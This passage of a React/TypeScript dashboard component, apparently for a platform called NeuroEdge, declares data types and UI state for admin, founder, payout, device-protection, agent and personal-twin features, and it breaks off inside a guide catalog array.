import React, { useEffect, useMemo, useRef, useState } from "react";
import { useNotifications } from "@/services/notificationStore";
import { chatContext } from "@/services/chatContext";
import { listConversations } from "@/services/conversationStore";
import { confirmSafeAction, recoveryGuidance } from "@/services/safetyPrompts";
import { isFounderUser } from "@/services/founderAccess";
import { applyBrandingToDocument, defaultBranding, loadBranding, saveBranding, type BrandingConfig } from "@/services/branding";

type View = "founder" | "admin" | "developer" | "agents" | "user" | "enterprise";

interface ServiceStatus {
  name: string;
  status: "online" | "offline" | "degraded";
  detail: string;
}

interface KernelSnapshot {
  name: string;
  status: string;
  version: string;
}

interface UsageSummary {
  totals?: {
    requests?: number;
    inputTokens?: number;
    outputTokens?: number;
    totalTokens?: number;
  };
}

interface UserRecord {
  id: string;
  name: string;
  email: string;
  role: "user" | "moderator" | "admin" | "founder" | "developer";
  status: "active" | "pending" | "review" | "banned" | "verified" | "suspended" | "revoked";
  founderRegistered?: boolean;
  companyOwnedOnly?: boolean;
  allowedDeviceId?: string;
  company?: string;
}

interface Offer {
  id: string;
  name: string;
  discountPct: number;
  active: boolean;
  audience: "all" | "new_users" | "enterprise";
}

interface Plan {
  id: string;
  name: string;
  monthly: number;
  annual: number;
  features: string[];
  active: boolean;
}

interface PaymentProfile {
  cardHolder: string;
  cardNumberMasked: string;
  expMonth: string;
  expYear: string;
  billingEmail: string;
  country: string;
  taxId: string;
  saveForAutoRenew: boolean;
}

interface CryptoRewardsConfig {
  enabled: boolean;
  chain: string;
  token: string;
  founderWalletAddress: string;
  neuroChainRpcUrl?: string;
  wdcContractAddress?: string;
  wdcWalletAppUrl?: string;
  rewardPerComputeUnit: string;
  minPayout: string;
  payoutSchedule: "hourly" | "daily" | "weekly" | "monthly";
  donorBonusEnabled: boolean;
  treasuryAllocationPct: number;
  notes: string;
}

interface RewardWallet {
  userId: string;
  userName: string;
  points: number;
  totalEarnedPoints: number;
  pendingCashUsd: number;
  pendingWdc: number;
  updatedAt: number;
}

interface RewardsLedger {
  config: {
    pointsPerUsd: number;
    wdcPerPoint: number;
    wdcListingLive: boolean;
    payoutMode: "points_only" | "cash_only" | "wdc_only" | "hybrid";
  };
  wallets: RewardWallet[];
}

interface OwnerComputeDevice {
  id: string;
  hostname: string;
  os: string;
  ownerUserId: string;
  ownerUserName?: string;
  ownerOrg?: string;
  status: string;
  computeEnabled?: boolean;
  pauseReason?: string;
  installToken?: string;
  stats?: {
    cpuPct?: number;
    ramPct?: number;
    tempC?: number;
    onBattery?: boolean;
    uptimeSec?: number;
    tasksCompleted?: number;
    computeHours?: number;
    earningsUsd?: number;
    earnedPoints?: number;
    updatedAt?: number;
  };
  updatedAt?: number;
}

interface OwnerPayoutProfile {
  userId: string;
  userName?: string;
  verifiedAt?: number;
  paymentMethod: string;
  bankName?: string;
  accountName?: string;
  accountNumberMasked?: string;
  swiftCode?: string;
  cardHolder?: string;
  cardLast4?: string;
  billingCountry?: string;
  wdcWalletAddress?: string;
  neuroChainAddress?: string;
}

interface OwnerPayoutRequest {
  id: string;
  userId: string;
  userName: string;
  target: string;
  amountUsd: number;
  amountWdc: number;
  points: number;
  status: string;
  createdAt: number;
  approvedAt?: number;
  sentAt?: number;
  settlement?: string;
  txRef?: string;
}

interface ComputePayoutBudget {
  period: string;
  totalRevenueUsd: number;
  allocatedUsd: number;
  pendingUsd: number;
  approvedUsd: number;
  sentUsd: number;
  reserveUsd: number;
  updatedAt?: number;
}

interface ComputeAutoPayoutConfig {
  enabled: boolean;
  period: "hourly" | "daily" | "weekly" | "monthly";
  maxPayoutsPerRun: number;
  lastRunBucket?: string;
  lastRunAt?: number;
  updatedAt?: number;
}

interface LoanOpsCompany {
  id: string;
  name: string;
  orgId?: string;
  contactEmail?: string;
  contactPhone?: string;
  legalPolicyRef?: string;
  attestationRequired?: boolean;
  autoRelockOnLoan?: boolean;
  mdmProvider?: string;
  oemProvider?: string;
  enrollmentMode?: string;
  lockWorkflow?: string;
  status?: string;
  updatedAt?: number;
}

interface LoanOpsDevice {
  id: string;
  companyId: string;
  orgId?: string;
  externalId?: string;
  model: string;
  serial?: string;
  imei?: string;
  ownerRef?: string;
  loanStatus: string;
  restrictedMode?: boolean;
  restrictionReason?: string;
  securityState?: string;
  protectionTier?: string;
  complianceState?: "trusted" | "re-enroll-required" | "restricted" | string;
  attestationProvider?: string;
  attestationStatus?: string;
  attestationAt?: number;
  lockState?: string;
  updatedAt?: number;
}

interface LoanOpsApiKey {
  id: string;
  companyId: string;
  name: string;
  keyMasked: string;
  status: string;
  createdAt: number;
}

interface LoanOpsDispute {
  id: string;
  deviceId: string;
  companyId: string;
  status: string;
  reason?: string;
  openedAt?: number;
  resolvedAt?: number;
}

interface UserProtectionProfile {
  userId: string;
  userName?: string;
  planTier: "free" | "paid";
  maxDevices: number;
  devices: Array<{ id: string; label: string; platform: string; status: string; createdAt?: number; updatedAt?: number }>;
  trustedContacts: Array<{ id: string; name: string; endpoint: string; channel: string; verified?: boolean }>;
  antiTheftConsent?: boolean;
  locationConsent?: boolean;
  cameraEvidenceConsent?: boolean;
  updatedAt?: number;
}

interface IdverseConfig {
  enabled: boolean;
  baseUrl: string;
  projectId: string;
  timeoutMs: number;
  strictBiometric: boolean;
  strictLiveness: boolean;
  apiKey: string;
  apiKeyMasked?: string;
}

interface TrainingStudioOptions {
  dedupe: boolean;
  piiFilter: boolean;
  autoTag: boolean;
  semanticChunking: boolean;
  crawlLinks: boolean;
  citationMode: boolean;
}

interface ModelControl {
  model: string;
  temperature: number;
  maxTokens: number;
  safetyMode: "strict" | "balanced" | "open";
}

interface FeatureFlags {
  [key: string]: boolean;
}

interface SupportTicket {
  id: string;
  subject: string;
  priority: "low" | "medium" | "high";
  status: "open" | "triaged" | "resolved";
  assignee: string;
}

interface DevApiKey {
  id: string;
  name: string;
  apiKey?: string;
  keyMasked: string;
  createdAt: number;
  revoked: boolean;
}

interface PermissionCatalogItem {
  id: string;
  group: string;
  label: string;
  scope: string;
  roles: string[];
}

interface AccessControlState {
  rolePermissions: Record<string, { defaultAction?: string; allow?: string[]; suspend?: string[]; revoke?: string[] }>;
  userOverrides: Array<{ userId: string; allow?: string[]; suspend?: string[]; revoke?: string[] }>;
  updatedAt?: number;
}

interface DeviceProtectionPolicy {
  enabled: boolean;
  monitorCommands: boolean;
  monitorFileChanges: boolean;
  monitorNetworkEgress: boolean;
  blockUnknownExecutables: boolean;
  virusScanOnUpload: boolean;
  dataExfiltrationShield: boolean;
  autoQuarantineOnCritical: boolean;
  enterpriseMode: boolean;
  retentionDays: number;
}

interface ManagedDeviceRecord {
  id: string;
  hostname: string;
  os: string;
  ownerUserId: string;
  ownerOrg: string;
  companyOwned: boolean;
  status: string;
  allowExternalStorage: boolean;
  allowUnsignedApps: boolean;
  antiVirusVersion: string;
  lastSeenAt: number;
  updatedAt: number;
}

interface WorkerActivityRecord {
  id: string;
  actor: string;
  actorRole: string;
  deviceId: string;
  eventType: string;
  command: string;
  filePath: string;
  networkTarget: string;
  details: string;
  severity: "low" | "medium" | "high" | "critical";
  threatSignals: string[];
  orgId?: string;
  workspaceId?: string;
  timestamp: number;
}

interface SecurityAlertRecord {
  id: string;
  title: string;
  severity: "low" | "medium" | "high" | "critical";
  actor: string;
  actorRole: string;
  deviceId: string;
  signals: string[];
  status: string;
  orgId?: string;
  workspaceId?: string;
  timestamp: number;
}

interface DeviceProtectionState {
  policy: DeviceProtectionPolicy;
  managedDevices: ManagedDeviceRecord[];
  workerActivities: WorkerActivityRecord[];
  securityAlerts: SecurityAlertRecord[];
  antiTheft?: {
    enabled?: boolean;
    optInRequired?: boolean;
    remoteLockAuthorizedOnly?: boolean;
  };
  loanProtection?: {
    enabled?: boolean;
    overdueDaysThreshold?: number;
    restrictedModeFeatures?: string[];
    disputeProcess?: boolean;
  };
  resilience?: {
    selfHealingEnabled?: boolean;
    rollbackEnabled?: boolean;
    safeMode?: {
      active?: boolean;
      reason?: string;
      activatedAt?: number;
    };
    lastRollback?: {
      version?: string;
      at?: number;
      actor?: string;
      reason?: string;
    };
  };
  snapshots?: Array<{
    version: string;
    createdAt: number;
    backendBuild?: string;
    frontendBuild?: string;
    schemaVersion?: string;
    envHash?: string;
  }>;
  integrityBaseline?: Record<string, string>;
  backup?: {
    enabled?: boolean;
    cadence?: string;
    retentionDays?: number;
    offsiteTarget?: string;
    encryptAtRest?: boolean;
    includeSnapshots?: boolean;
    includeEvents?: boolean;
    updatedAt?: number;
    lastRun?: {
      id?: string;
      mode?: string;
      startedAt?: number;
      completedAt?: number;
      snapshotCount?: number;
      eventCount?: number;
      encrypted?: boolean;
      offsiteTarget?: string;
      status?: string;
    };
  };
  zeroTrust?: {
    enabled?: boolean;
    lastRotatedAt?: number;
    rotationId?: string;
    policy?: string;
    actor?: string;
  };
  updatedAt?: number;
}

interface WebhookRecord {
  id: string;
  url: string;
  event: string;
  active: boolean;
}

interface IntegrationApp {
  id: string;
  appName: string;
  appDescription?: string;
  owner?: string;
  status: "active" | "paused" | "revoked";
  environment: "development" | "staging" | "production";
  scopes: string[];
  allowedOrigins: string[];
  rateLimitPerMin: number;
  webhookUrl?: string;
  apiKey?: string;
  keyMasked?: string;
  createdAt: number;
  updatedAt?: number;
}

interface DomainLink {
  id: string;
  name: string;
  url: string;
  type: "public" | "internal" | "admin" | "api" | "docs" | "test";
  environment: "development" | "staging" | "production" | "testing";
  audience: "users" | "admins" | "founder" | "developers" | "enterprise" | "internal";
  status: "active" | "inactive" | "testing" | "deprecated";
  description: string;
  tags: string[];
  owner: string;
  notes: string;
  createdAt: number;
  updatedAt: number;
}

interface AgentProfile {
  id: string;
  name: string;
  memoryDays: number;
  tools: string[];
  permission: "workspace" | "project" | "read_only";
}

interface UserAssistantProfile {
  id: string;
  name: string;
  rolePrompt: string;
  tone: "balanced" | "formal" | "casual" | "technical" | "creative";
  language: string;
  responseMode?: "concise" | "balanced" | "detailed";
  domainFocus?: string;
  startupPrompt?: string;
  avatarEmoji?: string;
  creativity: number;
  memoryDays: number;
  memoryMode?: "session" | "long_term";
  autoCitations?: boolean;
  knowledgeSources?: string[];
  knowledgeFiles?: Array<{
    id: string;
    name: string;
    size: number;
    mime: string;
    addedAt: number;
  }>;
  tools: string[];
  privacyMode: boolean;
  safeMode: boolean;
  createdAt: number;
  updatedAt: number;
}

interface AssistantMarketplacePack {
  id: string;
  owner: string;
  name: string;
  description: string;
  visibility: "public" | "private";
  tags: string[];
  downloads: number;
  rating: number;
  updatedAt: number;
  assistant: UserAssistantProfile;
}

interface AssistantUsageAnalytics {
  assistantId: string;
  turns: number;
  up: number;
  down: number;
  laugh: number;
  sad: number;
  avgConfidence: number;
  citationCoverage: number;
  updatedAt: number;
}

interface SavedPrompt {
  id: string;
  title: string;
  text: string;
}

interface EnterpriseDepartment {
  id: string;
  name: string;
  members: number;
  tokensPerMonth: number;
}

interface CreatorJobState {
  id: string;
  kind: string;
  status: "queued" | "running" | "completed" | "failed" | string;
  progress: number;
  error?: string;
  result?: Record<string, any>;
  created_at?: number;
  started_at?: number;
  finished_at?: number;
}

interface QualityEvalCoverage {
  suites?: Array<{ suite: string; totalCases: number; domains: string[]; ids: string[] }>;
  totalCases?: number;
  redTeamCases?: number;
}

interface QualityModelSummary {
  router?: {
    updatedAt?: number;
    variants?: Array<{ id: string; weight: number; domains: string[]; enabled: boolean }>;
  };
  outcomes?: {
    totalEvents?: number;
    models?: Array<{
      model: string;
      total: number;
      up: number;
      down: number;
      neutral: number;
      avgLatencyMs: number;
      avgConfidence: number;
      upRate: number;
      downRate: number;
    }>;
  };
}

interface DashboardGuideItem {
  id: string;
  title: string;
  view: View;
  roleScope: Array<"founder" | "admin" | "developer" | "enterprise" | "user" | "all">;
  summary: string;
  keywords: string[];
}

interface FrontierProgramItem {
  id: string;
  group: string;
  title: string;
  description: string;
  status: "planned" | "in_progress" | "blocked" | "done" | string;
  priority: "critical" | "high" | "medium" | "low" | string;
  owner: string;
  targetQuarter: string;
  notes: string;
  updatedAt?: number;
}

interface FrontierProgramMilestone {
  id: string;
  name: string;
  quarter: string;
  owner: string;
  status: "planned" | "in_progress" | "blocked" | "done" | string;
  successCriteria: string[];
  updatedAt?: number;
}

interface FrontierProgramState {
  version?: string;
  updatedAt?: number;
  items: FrontierProgramItem[];
  milestones: FrontierProgramMilestone[];
}

interface FrontierReadiness {
  gate?: boolean;
  readinessScore?: number;
  totals?: {
    items?: number;
    done?: number;
    inProgress?: number;
    planned?: number;
    blocked?: number;
    criticalDone?: number;
    criticalTotal?: number;
    highDone?: number;
    highTotal?: number;
  };
  topBlocked?: FrontierProgramItem[];
  recommendation?: string;
}

type RuntimeDomain = "kernel" | "ml" | "orchestrator" | "frontend";

interface RuntimeUnit {
  id: string;
  name: string;
  domain: RuntimeDomain;
  kind: "agent" | "engine" | "module" | "instance" | "file";
  registered: boolean;
  live: boolean;
  cause: string;
  suggestedFix: string;
  sourcePath?: string;
}

interface MarketReadinessConfig {
  verifiedAnswerMode: boolean;
  trustUxByDefault: boolean;
  hybridRoutingMode: "mesh_first" | "local_first" | "balanced";
  hitlRiskyActions: boolean;
  reliabilityGuardrails: boolean;
  benchmarkReleaseGates: boolean;
  domainPackStrictness: "standard" | "strict";
  deepResearchEnabled: boolean;
  connectorsEnabled: boolean;
  artifactsWorkspaceEnabled: boolean;
  updatedAt?: number;
}

interface ReliabilityProgramState {
  slo?: {
    availabilityPct: number;
    p95LatencyMs: number;
    errorBudgetPct: number;
    windowDays: number;
    owner: string;
    updatedAt?: number;
  };
  canary?: {
    enabled: boolean;
    trafficPct: number;
    autoRollback: boolean;
    lastRun?: any;
  };
  statusPage?: {
    mode: "operational" | "degraded" | "major_outage" | "maintenance";
    message: string;
    updatedAt?: number;
  };
  incidents?: Array<{
    id: string;
    title: string;
    severity: "sev1" | "sev2" | "sev3" | "sev4";
    status: "open" | "monitoring" | "resolved";
    summary?: string;
    owner?: string;
    createdAt?: number;
  }>;
}

interface ArtifactWorkspaceItem {
  id: string;
  title: string;
  type: "doc" | "code" | "plan" | "report";
  body: string;
  owner: string;
  visibility: "private" | "workspace";
  updatedAt: number;
}

interface NeuroExpansionSubmission {
  id: string;
  title: string;
  featureText: string;
  codeText: string;
  status: "blocked" | "pending_approval" | "approved" | "rejected" | "merged";
  scan: {
    severity: "low" | "medium" | "high" | "critical";
    signals: string[];
    doctrineOk: boolean;
    doctrineReason?: string;
  };
  metadata: {
    uploadedBy: string;
    uploadedByRole: string;
    uploadedAt: number;
    orgId: string;
    workspaceId: string;
  };
  review?: {
    decisionBy: string;
    decisionRole: string;
    decisionAt: number;
    decision: "approve" | "reject";
    reason?: string;
  };
  merge?: {
    mergedBy: string;
    mergedAt: number;
    targetPath: string;
    testsRequested: boolean;
  };
}

interface NeuroExpansionState {
  settings: {
    enabled: boolean;
    autoDailyScan: boolean;
    requireFounderApproval: boolean;
    autoTestOnMerge: boolean;
    placeholderScanRoots: string[];
    maxFindings: number;
    lastDailyRunAt: number;
  };
  submissions: NeuroExpansionSubmission[];
  autoProposals: Array<{
    id: string;
    createdAt: number;
    placeholdersDetected: number;
    candidateModules: string[];
    rationale: string[];
    status: "pending_approval" | "approved" | "rejected";
  }>;
}

type UploadTier = "founder" | "admin" | "paid" | "free";
type DashboardRole = "founder" | "admin" | "developer" | "enterprise" | "user";

const Dashboard: React.FC = () => {
  const { addNotification } = useNotifications();
  const [view, setView] = useState<View>("user");
  const [services, setServices] = useState<ServiceStatus[]>([]);
  const [kernels, setKernels] = useState<KernelSnapshot[]>([]);
  const [usage, setUsage] = useState<UsageSummary>({});
  const [adminLogs, setAdminLogs] = useState<any[]>([]);
  const [adminAudit, setAdminAudit] = useState<any[]>([]);
  const [adminAgents, setAdminAgents] = useState<any[]>([]);
  const [adminVersion, setAdminVersion] = useState<any>({});
  const [adminMetrics, setAdminMetrics] = useState<any>({});
  const [qualityEvalCoverage, setQualityEvalCoverage] = useState<QualityEvalCoverage | null>(null);
  const [qualityReliability, setQualityReliability] = useState<any>(null);
  const [qualityRetrieval, setQualityRetrieval] = useState<any>(null);
  const [qualityTrust, setQualityTrust] = useState<any>(null);
  const [qualityModelSummary, setQualityModelSummary] = useState<QualityModelSummary | null>(null);
  const [modelRouterDraft, setModelRouterDraft] = useState("");
  const [benchmarkBaselinesDraft, setBenchmarkBaselinesDraft] = useState("");
  const [frontierProgram, setFrontierProgram] = useState<FrontierProgramState | null>(null);
  const [frontierReadiness, setFrontierReadiness] = useState<FrontierReadiness | null>(null);
  const [frontierItemId, setFrontierItemId] = useState("");
  const [frontierItemOwner, setFrontierItemOwner] = useState("founder");
  const [frontierItemStatus, setFrontierItemStatus] = useState<"planned" | "in_progress" | "blocked" | "done">("planned");
  const [frontierItemPriority, setFrontierItemPriority] = useState<"critical" | "high" | "medium" | "low">("high");
  const [frontierItemNotes, setFrontierItemNotes] = useState("");
  const [frontierBulkIds, setFrontierBulkIds] = useState("");
  const [frontierBulkStatus, setFrontierBulkStatus] = useState<"planned" | "in_progress" | "blocked" | "done">("in_progress");
  const [frontierMilestoneId, setFrontierMilestoneId] = useState("");
  const [frontierMilestoneName, setFrontierMilestoneName] = useState("");
  const [frontierMilestoneQuarter, setFrontierMilestoneQuarter] = useState("Q2-2026");
  const [frontierMilestoneOwner, setFrontierMilestoneOwner] = useState("founder");
  const [frontierMilestoneStatus, setFrontierMilestoneStatus] = useState<"planned" | "in_progress" | "blocked" | "done">("planned");
  const [frontierMilestoneCriteria, setFrontierMilestoneCriteria] = useState("");
  const [runtimeDomain, setRuntimeDomain] = useState<RuntimeDomain>("kernel");
  const [selectedRuntimeUnit, setSelectedRuntimeUnit] = useState<RuntimeUnit | null>(null);
  const [runtimeTwinScan, setRuntimeTwinScan] = useState<any>(null);
  const [runtimeAgentRegistry, setRuntimeAgentRegistry] = useState<Array<{ name: string; status: string }>>([]);
  const [runtimeScanLoading, setRuntimeScanLoading] = useState(false);
  const [runtimeScanAt, setRuntimeScanAt] = useState<number>(0);
  const [marketReadinessConfig, setMarketReadinessConfig] = useState<MarketReadinessConfig>({
    verifiedAnswerMode: true,
    trustUxByDefault: true,
    hybridRoutingMode: "balanced",
    hitlRiskyActions: true,
    reliabilityGuardrails: true,
    benchmarkReleaseGates: true,
    domainPackStrictness: "strict",
    deepResearchEnabled: true,
    connectorsEnabled: true,
    artifactsWorkspaceEnabled: true,
  });
  const [marketReadinessSummary, setMarketReadinessSummary] = useState<any>(null);
  const [reliabilityProgram, setReliabilityProgram] = useState<ReliabilityProgramState | null>(null);
  const [sloDraft, setSloDraft] = useState({
    availabilityPct: "99.9",
    p95LatencyMs: "2500",
    errorBudgetPct: "0.1",
    windowDays: "30",
    owner: "sre",
  });
  const [canaryTrafficPct, setCanaryTrafficPct] = useState("5");
  const [canaryAutoRollback, setCanaryAutoRollback] = useState(true);
  const [statusPageMode, setStatusPageMode] = useState<"operational" | "degraded" | "major_outage" | "maintenance">("operational");
  const [statusPageMessage, setStatusPageMessage] = useState("All systems operational.");
  const [incidentTitle, setIncidentTitle] = useState("");
  const [incidentSeverity, setIncidentSeverity] = useState<"sev1" | "sev2" | "sev3" | "sev4">("sev3");
  const [incidentSummary, setIncidentSummary] = useState("");
  const [neuroExpansion, setNeuroExpansion] = useState<NeuroExpansionState | null>(null);
  const [neuroExpansionNotifications, setNeuroExpansionNotifications] = useState<any[]>([]);
  const [neuroExpansionTitle, setNeuroExpansionTitle] = useState("");
  const [neuroExpansionFeature, setNeuroExpansionFeature] = useState("");
  const [neuroExpansionCode, setNeuroExpansionCode] = useState("");
  const [neuroExpansionReviewReason, setNeuroExpansionReviewReason] = useState("");
  const [neuroExpansionPrBaseBranch, setNeuroExpansionPrBaseBranch] = useState("main");
  const [neuroExpansionPrMaterialize, setNeuroExpansionPrMaterialize] = useState(false);
  const [neuroExpansionPrPush, setNeuroExpansionPrPush] = useState(false);
  const [neuroExpansionPatchRunTests, setNeuroExpansionPatchRunTests] = useState(true);
  const [neuroExpansionPatchTestCommand, setNeuroExpansionPatchTestCommand] = useState("pnpm run typecheck");
  const [neuroExpansionPlaceholderReport, setNeuroExpansionPlaceholderReport] = useState<any>(null);
  const [neuroExpansionSettingsDraft, setNeuroExpansionSettingsDraft] = useState({
    enabled: true,
    autoDailyScan: true,
    requireFounderApproval: true,
    autoTestOnMerge: true,
    placeholderScanRoots: "src,../frontend/src,../ml",
    maxFindings: "500",
  });
  const [artifactWorkspace, setArtifactWorkspace] = useState<ArtifactWorkspaceItem[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_artifact_workspace_v1");
      return raw ? JSON.parse(raw) : [];
    } catch {
      return [];
    }
  });
  const [artifactDraft, setArtifactDraft] = useState({
    title: "",
    type: "doc" as ArtifactWorkspaceItem["type"],
    body: "",
    visibility: "private" as ArtifactWorkspaceItem["visibility"],
  });
  const [twinOutput, setTwinOutput] = useState<any>(null);
  const [backendOutput, setBackendOutput] = useState<any>(null);
  const [twinQuestion, setTwinQuestion] = useState("");
  const [twinZipPath, setTwinZipPath] = useState("");
  const [twinUploadedFiles, setTwinUploadedFiles] = useState<
    Array<{ name: string; type: string; size: number; text_sample: string }>
  >([]);
  const [twinUploadedZips, setTwinUploadedZips] = useState<Array<{ name: string; data_base64: string }>>([]);
  const [twinIncludeAnalyze, setTwinIncludeAnalyze] = useState(true);
  const [twinIncludeReport, setTwinIncludeReport] = useState(true);
  const [twinChannelsBootstrap, setTwinChannelsBootstrap] = useState<any>(null);
  const [twinChannelDraft, setTwinChannelDraft] = useState({
    channel: "whatsapp",
    provider: "official_api",
    handle: "",
    display_name: "",
    consent_granted: true,
    verified: false,
    auto_reply_enabled: true,
  });
  const [twinAvailabilityMode, setTwinAvailabilityMode] = useState("active");
  const [twinAvailabilityNotes, setTwinAvailabilityNotes] = useState("");
  const [twinAutoEventDraft, setTwinAutoEventDraft] = useState({
    event_type: "message",
    channel: "whatsapp",
    sender: "",
    incoming_text: "",
  });
  const [twinAutoReplyDraft, setTwinAutoReplyDraft] = useState<any>(null);
  const [twinApprover, setTwinApprover] = useState("owner");
  const [twinMarketMap, setTwinMarketMap] = useState<any>(null);
  const [twinSendChannelId, setTwinSendChannelId] = useState("");
  const [twinSendTestMessage, setTwinSendTestMessage] = useState("Hello from NeuroEdge Personal Twin.");
  const [twinCallConfig, setTwinCallConfig] = useState<any>(null);
  const [twinCloneCustomization, setTwinCloneCustomization] = useState<any>(null);
  const [twinCloneVoiceJson, setTwinCloneVoiceJson] = useState("[]");
  const [twinCloneVideoJson, setTwinCloneVideoJson] = useState("[]");
  const [twinClonePresetsJson, setTwinClonePresetsJson] = useState("[]");
  const [mobileTwinBridge, setMobileTwinBridge] = useState<any>(null);
  const [mobileTwinDeviceDraft, setMobileTwinDeviceDraft] = useState({
    id: "",
    platform: "android",
    deviceName: "",
    appVersion: "1.0.0",
    osVersion: "",
    attestationProvider: "android_play_integrity",
    attestationStatus: "trusted",
  });
  const [mobileTwinSyncDraft, setMobileTwinSyncDraft] = useState({
    deviceId: "",
    pushToken: "",
    permissionCallScreening: true,
    capabilityCallAssist: true,
    capabilityVoipAnswer: true,
    capabilityWhatsappCallAssist: true,
    capabilityVideoAvatar: true,
    status: "online",
  });
  const [mobileTwinActionDraft, setMobileTwinActionDraft] = useState({
    deviceId: "",
    actionType: "answer_phone_call",
    payloadJson: "{\"reason\":\"user_away\"}",
  });
  const [mobileTwinPendingDeviceId, setMobileTwinPendingDeviceId] = useState("");
  const [mobileTwinPendingActions, setMobileTwinPendingActions] = useState<any[]>([]);
  const [mobileTwinReceiptDraft, setMobileTwinReceiptDraft] = useState({
    actionId: "",
    deviceId: "",
    status: "completed",
    resultJson: "{\"ok\":true}",
  });
  const [opsVoiceQuery, setOpsVoiceQuery] = useState("");
  const [opsVoiceListening, setOpsVoiceListening] = useState(false);
  const [opsVoiceAutoSpeak, setOpsVoiceAutoSpeak] = useState(true);
  const [opsVoiceLiveInterrupt, setOpsVoiceLiveInterrupt] = useState(true);
  const [opsVoicePushToTalk, setOpsVoicePushToTalk] = useState(false);
  const [opsVoiceHotkey, setOpsVoiceHotkey] = useState("Alt+V");
  const [opsVoiceLanguage, setOpsVoiceLanguage] = useState("en-US");
  const [opsVoiceOutput, setOpsVoiceOutput] = useState<any>(null);
  const [opsVoiceStreamText, setOpsVoiceStreamText] = useState("");
  const [opsVoiceSupported, setOpsVoiceSupported] = useState(false);
  const recognitionRef = useRef<any>(null);
  const opsStreamTimerRef = useRef<any>(null);
  const [dashboardRole, setDashboardRole] = useState<DashboardRole>("user");
  const [dashboardAssistantQuery, setDashboardAssistantQuery] = useState("");

  const twinUploadTier = useMemo<UploadTier>(() => {
    if (isFounderUser()) return "founder";
    try {
      const rawUser = localStorage.getItem("neuroedge_user");
      const user = rawUser ? JSON.parse(rawUser) : {};
      const role = String(user?.role || "").toLowerCase();
      if (role === "founder") return "founder";
      if (role === "admin" || role === "moderator") return "admin";
      const tier = String(
        user?.plan ||
          localStorage.getItem("neuroedge_plan") ||
          localStorage.getItem("neuroedge_subscription_tier") ||
          ""
      ).toLowerCase();
      if (tier === "pro" || tier === "enterprise" || tier === "paid") return "paid";
    } catch {
      // fallback below
    }
    return "free";
  }, []);

  useEffect(() => {
    if (isFounderUser()) {
      setDashboardRole("founder");
      return;
    }
    try {
      const rawUser = localStorage.getItem("neuroedge_user");
      const user = rawUser ? JSON.parse(rawUser) : {};
      const role = String(user?.role || "").trim().toLowerCase();
      const tier = String(
        user?.plan ||
          localStorage.getItem("neuroedge_plan") ||
          localStorage.getItem("neuroedge_subscription_tier") ||
          ""
      )
        .trim()
        .toLowerCase();
      if (role === "founder") {
        setDashboardRole("founder");
        return;
      }
      if (role === "admin" || role === "moderator") {
        setDashboardRole("admin");
        return;
      }
      if (role === "developer") {
        setDashboardRole("developer");
        return;
      }
      if (role === "enterprise" || tier === "enterprise") {
        setDashboardRole("enterprise");
        return;
      }
      if (tier === "pro" || tier === "paid") {
        setDashboardRole("developer");
        return;
      }
    } catch {
      // keep user fallback
    }
    setDashboardRole("user");
  }, []);

  const allowedViews = useMemo<View[]>(() => {
    switch (dashboardRole) {
      case "founder":
        return ["founder", "admin", "developer", "agents", "user", "enterprise"];
      case "admin":
        return ["admin", "developer", "agents", "user", "enterprise"];
      case "developer":
        return ["developer", "agents", "user"];
      case "enterprise":
        return ["enterprise", "agents", "user"];
      default:
        return ["user", "agents"];
    }
  }, [dashboardRole]);
  const canAccessAdminOps = useMemo(
    () => dashboardRole === "founder" || dashboardRole === "admin",
    [dashboardRole]
  );
  const canAccessLoanOps = useMemo(
    () => dashboardRole === "founder" || dashboardRole === "admin" || dashboardRole === "enterprise",
    [dashboardRole]
  );

  const dashboardGuideCatalog = useMemo<DashboardGuideItem[]>(
    () => [
      {
        id: "founder-aegis",
        title: "Aegis Shield Controls",
        view: "founder",
        roleScope: ["founder", "admin"],
        summary: "Device protection, anti-theft, safe mode, integrity checks, rollback, and zero-trust controls.",
        keywords: ["aegis", "shield", "safe mode", "rollback", "integrity", "security", "antitheft", "backup"],
      },
      {
        id: "founder-twin",
        title: "Twin Systems",
        view: "founder",
        roleScope: ["founder", "admin"],
        summary: "Twin Scan, Analyze, Evolve, Report, Ask Twin, and NeuroTwin profile controls.",
        keywords: ["twin", "neurotwin", "scan", "analyze", "evolve", "report", "ask twin"],
      },
      {
        id: "founder-training",
        title: "Training Studio",
        view: "founder",
        roleScope: ["founder", "admin"],
        summary: "Ingest text/files/urls and run training jobs for system learning.",
        keywords: ["training", "ingest", "dataset", "feedback", "crawl", "urls", "zip"],
      },
      {
        id: "founder-reliability-ops",
        title: "Reliability Ops",
        view: "founder",
        roleScope: ["founder", "admin"],
        summary: "SLO controls, canary runs, status page updates, and incident management.",
        keywords: ["reliability", "slo", "canary", "incident", "status page", "rollback", "sre"],
      },
      {
        id: "founder-artifacts-workspace",
        title: "Artifacts Workspace",
        view: "founder",
        roleScope: ["founder", "admin", "developer", "user"],
        summary: "Build and save docs/plans/code artifacts for collaborative iteration.",
        keywords: ["artifact", "workspace", "document", "plan", "code", "report"],
      },
      {
        id: "founder-branding",
        title: "Branding Studio",
        view: "founder",
        roleScope: ["founder", "admin"],
        summary: "Upload logos/backgrounds and configure product visual identity.",
        keywords: ["branding", "logo", "favicon", "theme", "background"],
      },
      {
        id: "founder-links",
        title: "Domain & Link Registry",
        view: "founder",
        roleScope: ["founder", "admin"],
        summary: "Register domains, classify audience, verify reachability, and manage link lifecycle.",
        keywords: ["domain", "links", "url", "registry", "verify", "audience"],
      },
      {
        id: "admin-moderation",
        title: "Admin Moderation",
        view: "admin",
        roleScope: ["founder", "admin"],
        summary: "Manage users, content reviews, support tickets, and moderation actions.",
        keywords: ["moderation", "tickets", "support", "users", "reports", "review"],
      },
      {
        id: "developer-api",
        title: "Developer API Workspace",
        view: "developer",
        roleScope: ["founder", "admin", "developer"],
        summary: "Create API keys, manage webhooks, model/env settings, and debug logs.",
        keywords: ["api", "keys", "webhook", "sdk", "debug", "environment", "dev"],
      },
      {
        id: "agents-studio",
        title: "AI Agent Studio",
        view: "agents",
        roleScope: ["all"],
        summary: "Create/edit agents, configure tools, permissions, and memory settings.",
        keywords: ["agent", "studio", "tools", "memory", "permissions"],
      },
      {
        id: "user-chat",
        title: "User Chat Workspace",
        view: "user",
        roleScope: ["all"],
        summary: "Main chat, saved prompts, usage visibility, and personal workspace controls.",
        keywords: ["chat", "prompt", "history", "workspace", "new chat"],
      },
      {
        id: "enterprise-governance",
        title: "Enterprise Governance",
        view: "enterprise",
        roleScope: ["founder", "admin", "enterprise"],
        summary: "Department usage, team roles, compliance exports, and SSO controls.",
